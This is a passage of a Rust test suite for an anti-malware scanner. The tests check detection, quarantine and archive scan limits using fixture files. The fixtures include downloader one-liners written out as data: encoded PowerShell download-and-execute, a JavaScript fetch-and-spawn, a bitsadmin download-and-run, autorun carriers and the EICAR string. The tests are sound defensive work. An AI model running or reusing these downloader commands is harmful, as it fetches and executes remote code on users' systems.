        fs::create_dir_all(&downloads).unwrap();
        let appxbundle_file = downloads.join("safe-simulator-store-package.appxbundle");
        let msixbundle_file = downloads.join("safe-simulator-desktop-package.msixbundle");
        let inner_appx = zip_with_stored_entries(&[(
            b"assets/safe-eicar.txt",
            b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
        )]);
        let inner_msix = zip_with_stored_entries(&[(
            b"vfs/programfiles/app/safe-eicar.txt",
            b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
        )]);
        fs::write(
            &appxbundle_file,
            zip_with_stored_entries(&[(b"packages/store-package.appx", &inner_appx)]),
        )
        .unwrap();
        fs::write(
            &msixbundle_file,
            zip_with_stored_entries(&[(b"packages/desktop-package.msix", &inner_msix)]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for (file_name, package_name, entry_name) in [
            (
                "safe-simulator-store-package.appxbundle",
                "packages/store-package.appx",
                "assets/safe-eicar.txt",
            ),
            (
                "safe-simulator-desktop-package.msixbundle",
                "packages/desktop-package.msix",
                "vfs/programfiles/app/safe-eicar.txt",
            ),
        ] {
            assert!(report.threats.iter().any(|threat| {
                threat.file_name == file_name
                    && threat.detection_type == DetectionType::Signature
                    && threat.confidence == ThreatConfidence::Confirmed
                    && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                    && threat.status == ThreatResultStatus::Quarantined
                    && threat.risk_score.reasons.iter().any(|reason| {
                        reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                            && reason.detail.contains(package_name)
                            && reason.detail.contains(entry_name)
                    })
            }));
        }
        assert!(report.quarantined_files >= 2);
        assert!(!appxbundle_file.exists());
        assert!(!msixbundle_file.exists());
    }

    #[test]
    fn nested_zip_entry_safe_simulator_is_detected_and_outer_archive_quarantined() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("nested-safe-simulator-archive.zip");
        let inner_zip = zip_with_deflated_entries(&[(
            b"payload/safe-eicar.txt",
            b"ZENTOR-SAFE-EICAR-SIMULATOR-FILE",
        )]);
        fs::write(
            &file,
            zip_with_stored_entries(&[(b"archives/inner-safe.zip", &inner_zip)]),
        )
        .unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "nested-safe-simulator-archive.zip"
                && threat.detection_type == DetectionType::Signature
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat.status == ThreatResultStatus::Quarantined
                && threat.risk_score.reasons.iter().any(|reason| {
                    reason.id == "ZNE-ZENTOR-SAFE-TEST-001"
                        && reason.detail.contains("archives/inner-safe.zip")
                        && reason.detail.contains("payload/safe-eicar.txt")
                })
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn zip_entry_script_rule_and_heuristics_are_reported_without_confirmed_quarantine() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("script-rule-archive.zip");
        fs::write(
            &file,
            zip_with_deflated_entries(&[(
                b"scripts/dropper.ps1",
                b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/a')",
            )]),
        )
        .unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "script-rule-archive.zip"
                    && matches!(
                        threat.detection_type,
                        DetectionType::Signature | DetectionType::Heuristic
                    )
                    && matches!(
                        threat.threat_category,
                        ThreatCategory::SuspiciousDownloader | ThreatCategory::SuspiciousScript
                    )
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat.risk_score.reasons.iter().any(|reason| {
                        reason.id == "encoded_script_command"
                            && reason.detail.contains("scripts/dropper.ps1")
                    })
                    && threat.risk_score.reasons.iter().any(|reason| {
                        reason.id == "download_execute_script"
                            && reason.detail.contains("scripts/dropper.ps1")
                    })
            }),
            "{report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn standard_eicar_is_detected_or_reported_when_os_blocks_read() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("eicar.com");
        fs::write(
            &file,
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
        )
        .unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        let eicar_quarantined = report.threats.iter().any(|threat| {
            threat.threat_name == "EICAR safe anti-malware test file"
                && threat.confidence == ThreatConfidence::Confirmed
                && matches!(
                    threat.status,
                    ThreatResultStatus::Quarantined | ThreatResultStatus::Detected
                )
        });
        let os_block_reported = report.threats.iter().any(|threat| {
            threat.threat_name == "Windows anti-malware blocked file access"
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.status == ThreatResultStatus::Detected
                && threat.reason_summary.contains("did not claim quarantine")
        });
        assert!(
            eicar_quarantined || os_block_reported,
            "expected EICAR quarantine or OS-block detection: {report:#?}"
        );
        if report.quarantined_files > 0 {
            assert!(!file.exists());
        }
    }

    #[test]
    fn windows_antimalware_blocked_read_errors_are_confirmed_detections() {
        let error = anyhow::Error::new(io::Error::from_raw_os_error(WINDOWS_ERROR_VIRUS_INFECTED));
        assert!(windows_antimalware_blocked_scan_error(&error));

        let dir = tempdir().unwrap();
        let path = dir.path().join("blocked-eicar.com");
        let threat = threat_from_windows_antimalware_block(&path, 68, &error);

        assert_eq!(
            threat.threat_name,
            "Windows anti-malware blocked file access"
        );
        assert_eq!(threat.confidence, ThreatConfidence::Confirmed);
        assert_eq!(threat.status, ThreatResultStatus::Detected);
        assert_eq!(threat.risk_score.verdict, RiskVerdict::ConfirmedMalware);
        assert_eq!(threat.recommended_action, RecommendedAction::Review);
        assert!(threat.reason_summary.contains("did not claim quarantine"));
    }

    #[test]
    fn known_bad_hash_fixture_is_detected_and_auto_quarantined_by_confirmed_mode() {
        let dir = tempdir().unwrap();
        let file = dir.path().join("known-bad-hash-fixture.bin");
        fs::write(&file, b"harmless-known-bad-fixture").unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.threat_name == "Confirmed threat"
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat
                    .risk_score
                    .reasons
                    .iter()
                    .any(|reason| reason.id == "known_bad_hash")
                && matches!(
                    threat.status,
                    ThreatResultStatus::Quarantined | ThreatResultStatus::Detected
                )
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_detects_known_bad_bin_in_downloads() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("known-bad-payload.bin");
        fs::write(&file, b"harmless-known-bad-fixture").unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(report.threats.iter().any(|threat| {
            threat.file_name == "known-bad-payload.bin"
                && threat.confidence == ThreatConfidence::Confirmed
                && threat.risk_score.verdict == RiskVerdict::ConfirmedMalware
                && threat
                    .risk_score
                    .reasons
                    .iter()
                    .any(|reason| reason.id == "known_bad_hash")
                && matches!(
                    threat.status,
                    ThreatResultStatus::Quarantined | ThreatResultStatus::Detected
                )
        }));
        assert!(report.quarantined_files >= 1);
        assert!(!file.exists());
    }

    #[test]
    fn quick_scan_reports_zip_with_nested_executable_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("invoice-archive.zip");
        fs::write(&file, zip_with_entry_name(b"invoice.exe")).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "invoice-archive.zip"
                    && threat.detection_type == DetectionType::Heuristic
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "archive_suspicious_executable")
            }),
            "expected suspicious archive review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_zip_with_deceptive_nested_executable_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("documents-archive.zip");
        fs::write(&file, zip_with_entry_name(b"documents/invoice.pdf.exe")).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "documents-archive.zip"
                    && threat.detection_type == DetectionType::Heuristic
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "archive_suspicious_executable")
            }),
            "expected deceptive nested archive executable review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_zip_autorun_executable_bundle_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("media-autoplay.zip");
        fs::write(
            &file,
            zip_with_stored_entries(&[
                (b"autorun.inf", b"[autorun]\nopen=setup.exe\n".as_slice()),
                (b"setup/setup.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "media-autoplay.zip"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::PersistenceIndicator
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "archive_autorun_executable_bundle")
            }),
            "expected ZIP autorun executable bundle review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_zip_autorun_inf_command_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("launcher-autoplay.zip");
        fs::write(
            &file,
            zip_with_stored_entries(&[
                (
                    b"autorun.inf",
                    b"[autorun]\nopen=setup.exe /quiet\n".as_slice(),
                ),
                (b"setup/setup.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "launcher-autoplay.zip"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::PersistenceIndicator
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "archive_autorun_inf_executable_command")
            }),
            "expected ZIP autorun.inf executable-command review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_zip_shortcut_executable_bundle_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("shortcut-bundle.zip");
        fs::write(
            &file,
            zip_with_stored_entries(&[
                (b"launch/support.lnk", b"shortcut placeholder".as_slice()),
                (b"bin/support.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "shortcut-bundle.zip"
                    && threat.detection_type == DetectionType::Heuristic
                    && matches!(
                        threat.threat_category,
                        ThreatCategory::SuspiciousDownloader | ThreatCategory::SuspiciousScript
                    )
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.recommended_action == RecommendedAction::Review
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "archive_shortcut_executable_bundle")
            }),
            "expected ZIP shortcut executable bundle review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_oversized_archive_content_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("oversized-archive.zip");
        let oversized_body = vec![b'a'; 1024 * 1024 + 1];
        fs::write(
            &file,
            zip_with_stored_entries(&[(b"payload/large.txt", &oversized_body)]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_archive_entry_count_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("entry-count-limit-archive.zip");
        let entries = (0..65)
            .map(|index| {
                (
                    format!("payload/count-entry-{index:03}.txt").into_bytes(),
                    b"benign archive entry-count fixture".to_vec(),
                )
            })
            .collect::<Vec<_>>();
        fs::write(&file, zip_with_owned_stored_entries(&entries)).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("entry-count-limit-archive.zip")
                && error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_archive_total_content_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("total-content-limit-archive.zip");
        let chunk = vec![b't'; 900 * 1024];
        let entries = (0..5)
            .map(|index| {
                (
                    format!("payload/total-content-entry-{index:03}.txt").into_bytes(),
                    chunk.clone(),
                )
            })
            .collect::<Vec<_>>();
        fs::write(&file, zip_with_owned_stored_entries(&entries)).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("total-content-limit-archive.zip")
                && error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_truncated_archive_content_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("truncated-archive.zip");
        fs::write(
            &file,
            zip_with_truncated_stored_entry(b"payload/truncated.txt", 64, b"short"),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_encrypted_archive_content_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("encrypted-archive.zip");
        fs::write(
            &file,
            zip_with_local_entry(
                b"payload/encrypted.txt",
                0x0001,
                0,
                b"benign encrypted-entry placeholder",
            ),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_unsupported_archive_content_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("unsupported-compression-archive.zip");
        fs::write(
            &file,
            zip_with_local_entry(
                b"payload/unsupported.txt",
                0,
                99,
                b"benign unsupported-compression placeholder",
            ),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error
                    .contains("did not extract files or treat unscanned archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_nested_archive_depth_limit_as_not_clean() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("depth-limit-archive.zip");
        fs::write(
            &file,
            zip_with_nested_archive_chain(&[
                b"archives/level1.zip",
                b"archives/level2.zip",
                b"archives/level3.zip",
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(
            report.status,
            ReportStatus::CompletedWithErrors,
            "{report:#?}"
        );
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty());
        assert_eq!(report.quarantined_files, 0);
        assert_eq!(report.skipped_files, 1);
        assert!(report
            .message
            .as_ref()
            .is_some_and(|message| { message.contains("skipped files were not reported clean") }));
        assert!(report.scan_errors.iter().any(|error| {
            error.contains("archive_content_scan_limited")
                && error.contains("Archive content scan limited")
                && error.contains("configured archive-depth limit")
                && error.contains("did not extract files or treat deeper archive content as clean")
        }));
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_disk_image_autorun_carrier_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("support-media.iso");
        fs::write(
            &file,
            disk_image_with_text(b"\0AUTORUN.INF\0[autorun]\0open=support.exe\0"),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support-media.iso"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::PersistenceIndicator
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "disk_image_autorun_executable")
            }),
            "expected disk image autorun carrier review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_encoded_downloader_script_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("dropper.ps1");
        fs::write(
            &file,
            b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.txt'); Start-Process calc.exe",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "dropper.ps1"
                    && matches!(
                        threat.detection_type,
                        DetectionType::Signature | DetectionType::Heuristic
                    )
                    && threat.risk_score.verdict == RiskVerdict::ProbableMalware
                    && threat.confidence == ThreatConfidence::High
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ZNE-RULE-PS-ENCODED-DOWNLOAD-EXEC")
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ZNE-PS-ENCODED-DOWNLOAD-001")
            }),
            "expected encoded downloader script review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_powershell_carrier_files_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let module = downloads.join("profile.psm1");
        let manifest = downloads.join("module.psd1");
        let type_data = downloads.join("types.ps1xml");
        let powershell_carrier_fixture =
            b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.txt'); Start-Process calc.exe";
        fs::write(&module, powershell_carrier_fixture).unwrap();
        fs::write(&manifest, powershell_carrier_fixture).unwrap();
        fs::write(&type_data, powershell_carrier_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["profile.psm1", "module.psd1", "types.ps1xml"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && matches!(
                            threat.detection_type,
                            DetectionType::Signature | DetectionType::Heuristic
                        )
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "encoded_script_command")
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "download_execute_script")
                }),
                "expected PowerShell carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(module.exists());
        assert!(manifest.exists());
        assert!(type_data.exists());
    }

    #[test]
    fn quick_scan_reports_javascript_carrier_files_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let encoded_script = downloads.join("support.jse");
        let module_script = downloads.join("worker.mjs");
        let common_script = downloads.join("helper.cjs");
        let javascript_carrier_fixture =
            b"const payload = atob('AAAA'); fetch('https://example.invalid/payload.js'); require('child_process').spawn('cmd.exe');";
        fs::write(&encoded_script, javascript_carrier_fixture).unwrap();
        fs::write(&module_script, javascript_carrier_fixture).unwrap();
        fs::write(&common_script, javascript_carrier_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support.jse", "worker.mjs", "helper.cjs"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && matches!(
                            threat.detection_type,
                            DetectionType::Signature | DetectionType::Heuristic
                        )
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "encoded_script_command")
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "download_execute_script")
                }),
                "expected JavaScript carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(encoded_script.exists());
        assert!(module_script.exists());
        assert!(common_script.exists());
    }

    #[test]
    fn quick_scan_reports_batch_carrier_files_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let batch = downloads.join("support.bat");
        let command = downloads.join("repair.cmd");
        let batch_carrier_fixture =
            b"bitsadmin /transfer job https://example.invalid/payload.exe payload.exe\r\nstart payload.exe\r\npowershell -NoProfile -File helper.ps1";
        fs::write(&batch, batch_carrier_fixture).unwrap();
        fs::write(&command, batch_carrier_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support.bat", "repair.cmd"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && matches!(
                            threat.detection_type,
                            DetectionType::Signature | DetectionType::Heuristic
                        )
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "download_execute_script")
                }),
